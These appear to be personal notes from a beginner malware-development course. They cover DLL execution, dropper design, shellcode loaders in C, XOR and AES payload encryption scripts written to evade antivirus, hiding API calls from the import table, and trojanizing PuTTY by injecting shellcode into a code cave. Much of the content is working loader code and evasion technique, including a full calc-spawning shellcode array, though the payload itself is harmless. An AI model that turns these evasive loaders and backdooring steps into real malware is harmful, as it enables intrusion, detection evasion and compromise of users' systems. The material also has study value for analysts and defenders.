# Analyzing first EXE
Let's analyze the following PE in Process Hacker:
![[Pasted image 20240210102518.png]]

We can see a lot of information about the process that is handling our program:
![[Pasted image 20240210102717.png]]

If we go to the "Modules" tab, we can see the loaded DLLs by our process:
![[Pasted image 20240210102812.png]]
We need to be familiar with kernel32.dll, kernelBase.dll and ntdll.dll as they are DLLs that nearly all of the programs use dinamically.

If we go to the "Memory" section, we can see **the whole memory layout for this process:**
![[Pasted image 20240210103109.png]]
If we double click it, we can even see the code that is loaded in memory:
![[Pasted image 20240210103219.png]]

# Analyzing our first DLL
In the entry point for the DLLs, called DLLMain, we can see that there is a flag that receives this function that allows us to **control the behavior of the DLL depending on what happens**:
![[Pasted image 20240210103645.png]]
If the process attaches to the DLL, the behavior can be different than if the process detaches from the DLL.

From now on, most of the times the behavior will be the same.

## External functions on DLL
We can see the external function called "RunME", this means the process that loads the DLL can use this function called RunME from this DLL once the DLL is loaded in the memory region of the process.
The "Extern C" means that it needs to be compiled in C language (way to tell the compiler how this function must be compiled).
![[Pasted image 20240210103824.png]]

Let's compile the DLL and see the exported functions for the DLL.
We will use dumpbin, and list the exports for the DLL.
![[Pasted image 20240210104059.png]]
We can see the RunME function, but now, how do we execute it?
We already know that **DLLs DO NOT RUN INDEPENDENTLY IN MEMORY LIKE AN EXE FILE**. We need to load this DLL inside another process' memory. 
We luckily do not have to develop a program that loads this DLL. Windows has a program called RunDLL32.exe that allows us to specify a DLL and a function, and the program loads the DLL in memory and executes the given function.
### Using RunDLL32.exe to execute our DLL
![[sektor_beginner.png]]
By the way, we can see that if we do not specify a good DLL/function name path, the program does not give errors. 

When we load the DLL correctly, we can inspect the program Run32dll in Process Hacker to see if the DLL is loaded into memory as we expect:
![[sektor_beginner-1.png]]
CMD has a run32DLL process, but our DLL does not appear directly as it is **inside this process, does not have a process apart!** That gives us a hint that malware in DLL can be dangerous, as we are not seeing it in Process Hacker...
![[sektor_beginner-2.png]]
This is **the memory region of the process that is holding the DLL.**

We can also see the implant in the "Modules" section:
![[sektor_beginner-3.png]]

And see the functions that are exported by this DLL:
![[sektor_beginner-4.png]]

# Droppers
## What is a dropper
Programs that deliver **the final payload to the machine.** Phishing attacks use this type of programs. They are simple programs (do not need to be compiled code, can be JS code).

We will create our own dropper in C language. The payloads that can be used with the dropper are infinite, from reconnaisance payloads to advanced payloads with persistence, privEsc, etc. 

Payloads like meterpeter, empire, havoc, etc., are commonly used in pentesting assessments. But in this course, we will use a notepad.exe payload.

## Where to store the payload in the dropper?
The question is: **¿Where to store the payload in the dropper?**
We previously saw the sections of the PE file. We can store the payload in the .text section, in the .data section (**declared the payload as read** only data, e.g., global variable) or store the payload as a resource (.rsrc section) and tell the compiler that the shellcode is a resource, and use API calls to use the resource from the resources section.

### Storing the payload in the .text section
Let's open an implant that has the shellcode on the .text section, the literal code section of the program.

Here is the whole program:
```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// 4 byte payload shellcode.
	// 2 NOPS that do nothing
	// INT3 - suspend the process and give the control to the debugger. Allow the debugger to take control over the process.
	unsigned char payload[] = {
		0x90,		// NOP
		0x90,		// NOP
		0xcc,		// INT3
		0xc3		// RET
	};
	unsigned int payload_len = 4;
	
	// We have to allocate memory in order to run the payload over the process
	// Then copy the payload into the memory
	// Then execute the payload in the memory region

	// Here we allocate a memory buffer of the payload length
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to the created buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make the created buffer as executable.
	// We do not do it in the VirtualAlloc calls as AV engines and some hunting tools
	// May spot that we want to allocate RWX region 
	// We do a two step operation: allocate memory + change memory type to eXecute.
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");

	// The program will stop at this point.
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```

We declare dynamically the shellcode that we will execute as a char array (we know that this will be in the stack). 
Then, we allocate memory on the process, **but the allocation is only for reading+writing, not executing. 
This is to avoid AVs and tracers and be more stealthy.**
Then, we copy the payload to the created buffer and change the memory type that we created to executable. Lastly, we will run the memory that we marked as an executable, containing the payload.

Let's attach the debugger to the program running. After attaching the debugger to the program and searching for the shellcode pattern in memory (90 90 cc ce):
![[sektor_beginner-5.png]]

We can see that the pattern is in three sections:
![[sektor_beginner-6.png]]

Let's analyze in which sections is the pattern and why.
Section 1. Address 000001677DC30003. This is where our code is being executed... **inside the memory region that we allocated that is executable.**
![[sektor_beginner-7.png]]
This is exactly where the breakpoint is stored. We can also see that this piece of memory changed from RW to ER: 
![[sektor_beginner-8.png]]
It basically corresponds to this zone of the code, we can also see the modifications:
![[sektor_beginner-9.png]]
Let's see section 2. Address 0000000FDD71FBC3.
It basically corresponds to the stack region:
![[sektor_beginner-11.png]]

We declared the shellcode as a dynamic variable (char array) in our code:
![[sektor_beginner-12.png]]
Therefore, the program allocates these variables in the stack on the stack frame of main() before calling VirtualAlloc. We can see them on the stack:
![[sektor_beginner-14.png]]

Lastly, section 3, and the first section on which our shellcode is read by the program: the .text section. The .text section is the executable code, and therefore, on the lowest regions of memory (FFF....). The other two regions where the payload appeared were much further than this region, near the 000...
![[sektor_beginner-13.png]]

We can think now about the order in which the operations are used by the program:
- First, in .text, the shellcode (1x) is pushed into the stack (2x) as arguments for the VirtualAlloc function. It is pushed into the stack as the variables are dynamic in the main() function. 
- The VirtualAlloc function is called, generating a virtual zone of memory in which the payload is stored (3x). **We can see the three ocurrences described above, and mentioned now in the flow.**
- The memory changes to executable.
- The code in the memory region is executed (and therefore, our allocated shellcode).
### Storing payloads in the .data section
Let's look the source code of our implant in .data:
![[sektor_beginner-15.png]]

The payloads is initialized OUTSIDE the main function and outside any function, therefore, it is a global variable. 

Let's see where the shellcode is stored in the program when debugging it:
![[sektor_beginner-16.png]]
The shellcode is stored in two different sites, and not three as before.
We can first see that the payload is stored in the reserved address we made in the process, that we marked as executable after:
![[sektor_beginner-17.png]]


The other place where the payload is is .data of our process:
![[sektor_beginner-18.png]]
The payload is now in .data and not .text as **we declared it as a global variable.**

### Storing payloads in the .rsrc section
Let's see how a shellcode in C++ is stored in the resource section:
![[sektor_beginner-19.png]]
We cannot see the shellcode directly here in the code, as the shellcode is being taken as a resource. The resource with name FAVICON_ICON (FAVICON_ICO is the identifier, like a number).
The resource is being loaded, and its handle is being used to obtain the whole resource.
But then, how are we declaring our shellcode externally?

Well, we have to do some steps. First, declare the shellcode in an external file, for example, the shellcode of a calculator spawner called calc.ico:
![[sektor_beginner-20.png]]
This is the shellcode (cannot be rendered as it is binary).
Then, there is another file called the resources.rc file, which is used by the resource compiler. In this file we declare each of the resources and give it a name (the name that will be used in our program). Think about it as the file that is used to "link" the resources with our program.
![[sektor_beginner-21.png]]
We are basically saying that calc.ico is a RCDATA type of resource () and we will use it in our program as FAVICON_ICO.
¿What is RCDATA? Just read Windows docs:
![[sektor_beginner-22.png]]
Basically binary file that is directly added into the executable file.
The resources.h file is another file that is used to specify the calc.ico resource as FAVICON_ICO and not as a number:
![[sektor_beginner-23.png]]
Thanks to this file, we can refer to our resource as FAVICON_ICO and not as a number.
Lastly, we need to incorporate these resources in our binary. We need to tell the compiler to **link our CPP program with this program. For this, we do the following steps:**
![[sektor_beginner-24.png]]
First, use the resource compiler to take the RC file and transform it into a Windows resource. Then, use the resource converter and transform the Windows resource to an object file (**object files are the ones that we can link together**). Lastly, we use the compiler with our CPP program and link it with the object file (resources.o).

Let's attach the debugger to the program and see where the shellcode is stored (we can already think that it will be stored in the .rsrc memory section of the process):
![[sektor_beginner-25.png]]

We can see that the shellcode is stored in the .rsrc section (loaded as a resource) and also is in the memory zone that we marked as executable. This is straightforward as the shellcode is copied from the .rsrc section to the executable memory zone and gets executed.

# Payload encoding and encryption
Purpose of encoding/encrypting: hide the payload so a RE can't identify via signatures, etc., or at least it is harder to.
E.g., meterpreter is well known, you encode this payload so you can still use it and bypass defender.
## Encoding vs encryption
Encryption: Transform data to **keep it secret for others, e.g., a secret letter that only the chosen person can read it. The data cannot be consumed by other than the intended recipient.** You usually need an encryption algorithm and a key or something that only you and your recipients know.
Plaintext gets encrypted and turns into cyphertext.

Encoding: Transform data so it can be properly consumed by a different type of system, e.g., binary data in a website or special characters. It can be easily reversed. **Encoding is another method of transforming data, but uses well known algorithm. Reversing this operation is straightforward, as you do not need a key but the algorithm that was used to encode it in order to decode it.**

Difference: There is a secret component (key).
Examples: XOR (encryption), base64 (encoding.)

## Encoding our payload
We need our payload in binary format, for example, to encode it. 
We have a file called **calc.bin** that is the binary format of the payload that spawns calc.exe:
![[sektor_beginner-26.png]]

We have to add this hardcoded payload encoded in base64. Let's encode it, with certutil for example (we could use something more advanced but this works.)
![[sektor_beginner-27.png]]
Let's open the file and see it:
![[sektor_beginner-28.png]]
Let's remove the whitespaces:
![[sektor_beginner-29.png]]
Okay, this is the base64 of our payload. Now, we have to copy this payload into our code, so then we decode it.
It is important that we cannot encode the payload **directly in the code but we want to do it outside the code, as, if we encode it in code, the non-encoded payload is in the code and we are in the same position as if we do nothing! We want our payload to not appear in the code, in not a single section of the assembly.**

We copy the payload in base64 **outside main, as a global function. We know, as learnt in [[#Storing payloads in the .data section]]** that our base64 payload will be in .data as it is a global variable.

We craft a function to decode the base64 payload:
![[sektor_beginner-30.png]]
And we **need to allocate memory for the length of the payload in base64 as the payload in base64 is larger**. After allocating memory, we decode the payload calling this function and copy the decoded payload into the memory region. Then, we execute the memory region containing **our decoded payload, that will spawn the calc.exe:**
![[sektor_beginner-31.png]]

Let's see what happens in the debugger. The address on which the payload in base64 is stored is this one:
![[sektor_beginner-32.png]]

We can see in the memory map that is inside the .data section:
![[sektor_beginner-33.png]]

In the reserved memory zone, we can see that right now there is no data (the buffer is full of zeros):
![[sektor_beginner-34.png]]

This is because, as we can see in the code, we are in the getchar() function waiting for input; we have allocated memory for the buffer but this memory is empty as we haven't decoded the payload and neither have called VirtualProtect that executes the shellcode...
![[sektor_beginner-35.png]]

After we press enter, the first getchar() function is called, and also the DecodeBase64 and the VirtualProtect() function. We can now see that, in the same memory region as before, the shellcode appears **and also is the decoded shellcode! Not the base64 encoded one.**
![[sektor_beginner-36.png]]
Note that base64 is **not enough to hide our payload as rev. engineers and AV will look for it. If you want to use encoding, with no encryption, we must come up for our own algorithm for encoding.**

## Encrypting our payload with XOR
First of all, with encryption we need a key to encrypt our payload. 
Here is a python2 script that takes our payload in binary format (in a .bin file, for example) and encrypts it with a key:
```python
import sys

KEY = "mysecretkeee"

def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def printCiphertext(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')



try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()


ciphertext = xor(plaintext, KEY)
print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
```
Let's use this python2 script to generate a file of our binary shellcode but encrypted with an XOR with this key.
![[sektor_beginner-37.png]]

We also need the size of the payload.**Note that, in this case the size of the encrypted payload is the same as the size of the plaintext payload, as XOR is a bitwise operation.**

We implement the XOR operation in our code:
![[sektor_beginner-38.png]]

And then we just do what we did on [[#Encoding our payload]], we **put our ciphered payload as a variable, we allocate memory for the encrypted payload, we decrypt the payload and we copy the payload to the allocated buffer:**
![[sektor_beginner-39.png]]

Let's run the code in a debbuger to see what is happening:
![[sektor_beginner-40.png]]
We see that the encrypted payload is in the stack of our program.
![[sektor_beginner-41.png]]

The encrypted payload is now at the stack because we added it as **a local variable inside main()** and not as a global variable:
![[sektor_beginner-42.png]]

In the memory region of the VirtualAlloc we can see that there is not payload yet, as we have not still decrypted it and called VirtualProtect:
![[sektor_beginner-43.png]]

If we keep running the code, we can see that the payload is deciphered and added into this section:
![[sektor_beginner-44.png]]

And if we keep running the payload gets executed as the CreateThread function is called.

Let's do a little tweak: Let's try to add the encrypted payload in this memory zone and then perform the XOR operation in this memory zone, instead of decrypting and copying. For that, just change the function that performs the XOR to perform the XOR to the memory region of VirtualAlloc:
![[sektor_beginner-45.png]]

If we recompile the code and attach the debugger, we can see that the shellcode is copied into the memory but encrypted:
![[sektor_beginner-46.png]]

Then we decrypt this memory region:
![[sektor_beginner-47.png]]
And lastly it is executed popping our shellcode.
We saw a different approach by tweaking a bit with the operations!

## Encrypting our payload with AES
I won't step much here, as the process is the same but changing the encryption algorithm. 
In this case, the AES key is generated randomly in the python script and the used final key is the sha256 hash of the randomly generated key. **This is done as the AES algorithm needs keys of a fixed length, and therefore, our input gets "transformed" in that fixed length.**

```python
import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))


try:
    plaintext = open(sys.argv[1], "r").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)
print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
```

Using this script we get a key and the encrypted shellcode with that key using AES. In the code, we must craft this key and decrypt the encrypted payload. For that, we created this function:
![[sektor_beginner-48.png]]

And, as with the previous XOR code, we decrypt the shellcode with the generated key, we load it into the memory section that we reserved and we execute it:
![[sektor_beginner-49.png]]

# API call obfuscation - Hiding from IAT
We have talked about the [[import_address_table]], or IAT, in a separate section.
Let's look the last malware sample and see its IAT:
![[sektor_beginner-50.png]]
We can see that the IAT has been fulfilled by the OS as we know the memory addresses for each of the calls.

By looking at the IAT, a malware researcher or EDR could see what are the Windows and other library calls that the program is doing, and have an idea of our sample. **The purpose of this technique is to hide these IAT entries, so that our calls do not appear in the IAT (IAT hiding).** Note that this technique is an anti-reversing technique, but it does not help on a dynamic analysis approach as the reverse engineer can still see the API calls with more research. 

With all that said, we will try to hide VirtualAlloc, and then repeat the same approach to hide more of the calls once we know how to do it.

You can also see the IAT of a program with a native Visual Studio command: `dumpbin /imports <binary>`
![[sektor_beginner-51.png]]

One thing I have seen (I don't still know if this is true) is that kernel32.dll is always loaded into the same address for all the processes - regardless if you open a calc.exe, notepad.exe, or any other Windows process.

To know how to avoid our function calls from appearing in the IAT, we need to read the Windows documentation regarding DLLs and how do dinamically link them:
### Types of Dynamic Linking
There are two methods for calling a function in a DLL:
- In _load-time dynamic linking_, a module makes explicit calls to exported DLL functions as if they were local functions. This requires you to link the module with the import library for the DLL that contains the functions. An import library supplies the system with the information needed to load the DLL and locate the exported DLL functions when the application is loaded.
- In _run-time dynamic linking_, a module uses the [**LoadLibrary**](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) or [**LoadLibraryEx**](https://learn.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function to load the DLL at run time. After the DLL is loaded, the module calls the [**GetProcAddress**](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) function to get the addresses of the exported DLL functions. The module calls the exported DLL functions using the function pointers returned by **GetProcAddress**. This eliminates the need for an import library.

TL;DR: Unless you're doing **load time** dynamic linking (`LoadLibrary`/`GetProcAddress`), you'll have an import address table when calling into another module. If we don't do run-time dynamic linking, an entry for the IAT will be added in order to link our module with the address of the function in the library.

Therefore, the way to hide our calls in IAT is to do **run-time dynamic linking.** 
In order to get the address of the function of the external DLL, we can use the `GetProcAddress` function from the Microsoft API:
![[sektor_beginner-52.png]]

We can just specify the handle to the DLL module that we want to load and the function we want to call. This will return a pointer to the memory address of the exported function of that DLL.
Here is how we get the address at runtime of the VirtualProtect call:
```c
BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
rv = pVirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
```

The rest of the code can be the same, as we are doing the same call but using the pointer instead of calling the function directly. 
One thing to note is that pVirtualProtect was initialized as a global variable.

When we now inspect the IAT of the executable after compiling, we don't see the entry for this call:
![[sektor_beginner-53.png]]
![[sektor_beginner-55.png]]
BUT, we see the VirtualProtect table in the .data sections:
![[sektor_beginner-56.png]]

Why do we see this entry? Well, to get the pointer of the function in the DLL using the GetProcAddress, we needed to specify the function to get as a parameter:
![[sektor_beginner-57.png]]
That is a string! That is why it is appearing in .data

But we can obfuscate this string, if we do what we did with the shellcode: put the variable as a hardcoded encrypted variable and decrypt the string dinamically, so the literal function does not appear in the string section.

Here is a python script that uses the XOR to encrypt any of the text we give:
```python 
import sys

def xor_string(text, key):
    # Convierte la clave y la cadena de texto en listas de bytes
    key_bytes = bytearray(key, 'utf-8')
    text_bytes = bytearray(text, 'utf-8')
    
    # Realiza la operación XOR byte a byte
    result = bytearray()
    for i in range(len(text_bytes)):
        result.append(text_bytes[i] ^ key_bytes[i % len(key_bytes)])
    
    # Formatea la salida en un formato char[] de C++
    output = "{" + ", ".join([f"0x{byte:02X}" for byte in result]) + "}"
    
    return output

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python xor_script.py <key> <text>")
        sys.exit(1)
    
    key = sys.argv[1]
    text = sys.argv[2]
    
    result = xor_string(text, key)
    print(result)

```
The output of the script is a byte array of the encrypted function with the specified key (in this example we used a string that already exists in the binary as the key, to be more stealthy)
![[sektor_beginner-60.png]]

And now in our code we just decrypt dinamically this array and insert the variable as a parameter:
![[sektor_beginner-61.png]]

The resulting executable does not have the entry of VirtualProtect in the IAT and neither in the string section:
![[sektor_beginner-62.png]]
TD;DR - To hide our calls in IAT we can do run-time dynamic linking using GetProccAddress specifying  a handle of the DLL we want to get the function and the function name. Encrypt the function name so it does not appears when inspecting the strings of the PE.

```PYTHON
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char calc_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
unsigned int calc_len = sizeof(calc_payload);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

// Variable that will store the address of virtualprotect in the IAT dynamically
BOOL (__stdcall * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
// We can also call WINAPI instead __stdcall, it is a call convention to the Windows API.
// This means that pVirtualProtect can point to a function that has the same convention, and the same type.
//BOOL(WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	char key[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char sVirtualProtect[] = {0x17, 0x2B, 0x31, 0x30, 0x30, 0x27, 0x2B, 0x18, 0x3B, 0x25, 0x3F, 0x29, 0x2E, 0x3A};

	XOR((char*)sVirtualProtect, strlen(sVirtualProtect), key, sizeof(key));

	// Allocate buffer for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualProtect);

	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	// Find the declaration of Virtual Protect in msdn.
	rv = pVirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```

# Backdooring PE files
You can gain initial access, privEsc, or move laterally with a backdoored PE file. Depends on what you use the backdoored file for.
3 ways of backdooring PE files:
- Code cave -> **spare space in the PE File, usually in the .text segment, not occupied by other code.** Downside: little space for malware. Around few hundred bytes (mid-size shellcode).
- New section: You can set the size to anything you want. Downsize is that you have to set the section as **executable; this can get quickly called as malicious. So very powerful but easy to detect.**
- Memory section: Pick an existing section and increase the size (can be with the .text section, but requires more effort as you have to recalculate offsets).

Note that you can combine a few methods: You can find a codecave that loads additional code in other section; this other section does not need to be executable, reducing the risk.
### Backdooring PUTTY using the cavecodes in .text
Let's open PUTTY with x32dbg (it is a 32 bits program).
This is the entry point of the program:
![[sektor_beginner-63.png]]
If we visit the .text section, we can see that there is a lot of memory in that section that is not being used at the end. This section is a **codecave:**
![[sektor_beginner-64.png]]

We are going to trojanize PUTTY so that when oppening PUTTY our custom shellcode pops up, next to the common behavior of the application.
This is what we are going to do:
- Change the first few instructions in the entry point of PUTTY so these instructions are JMP to the codecave. 
- In the codecave, save the register values and flag values in the stack adding the pushad and pushfd flags.
- Add our shellcode in the codecave.
- Next to our shellcode, execute popad and popfd to go back to the normal status of the application (register and flag values)
- Add the instructions that we overwitrite in the entry point
- Perform a JMP to the instruction that would be normally executed after these instructions

This way, we can execute our shellcode and then go back to the normal flow of the program.

Let's start.

First, change the first instructions in the entry point of PUTTY so the JMP is to the codecave address. 
Let's save these instructions as we will  have to add them at the end of our routine to go back to the normal program flow.
Original entry point:
![[sektor_beginner-65.png]]

Modified entry point:
![[sektor_beginner-66.png]]

We can see that we lost the following instructions as they were overwritten by our JMP instruction:
0x00454AD0 | 6A 60 | push 60      
0x00454AD2 | 68 B07A4700 | push putty.477AB0     

The instruction in 00454AD7 is the first correct instruction that is still present. At the end of our shellcode, we will have to add the first two original instructions (6A 60 68 B0 7A 47 00) and jump to 0x00454AD7, which has the E8 08 21 00 00 instruction. This instruction was not overriden but the instructions have been displaced:
![[sektor_beginner-67.png]]
We will have to mimic this original situation:
![[sektor_beginner-65.png]]
But this restoring thing is for later. Let's append our shellcode in the codecave.

Let's go to the codecave and add a pushfd and pushad operation to save the register and flags values, as our shellcode is not position independent and will modify some of the register and flags:
![[sektor_beginner-68.png]]

Now, let's add our shellcode after this save operation:
![[sektor_beginner-70.png]]
Okay, let's save this patched executable and see if our shellcode is executed (right now, the entry point of the program points to this codecave so the shellcode should be executed):
![[sektor_beginner-71.png]]
Okay, the shellcode (calc.exe) is executed, but **the original program is not executed. This is obvious, as we have modified the routine to jump to our shellcode but we did not add the execution steps to go back to the normal program flow.**
But before, we have to fix a little thing in our shellcode, as the last **call ebp operation that the custom shellcode makes, ends the program completely.** Adding instructions after that call ebp operation is useless, so we have to skip that operation.
![[sektor_beginner-77.png]]
This is what happens on the "call ebp" operation, the program ends:
![[sektor_beginner-74.png]]
So what we do is to jump into an empty section of the codecave before reaching the operation that ends the program:
![[sektor_beginner-78.png]]
And after that we can restore the execution flow, first by executing popfd and popad (remember the order, we executed pushad, pushfd, now we have to undo the stack order) and then add the two broken original instructions and a JMP to the third original instruction of the code:
![[sektor_beginner-79.png]]

Now, if we patch the application, it will go to the codecave, execute the shellcode and then go back to the original PuTTY routine, popping the original program too:
![[sektor_beginner-80.png]]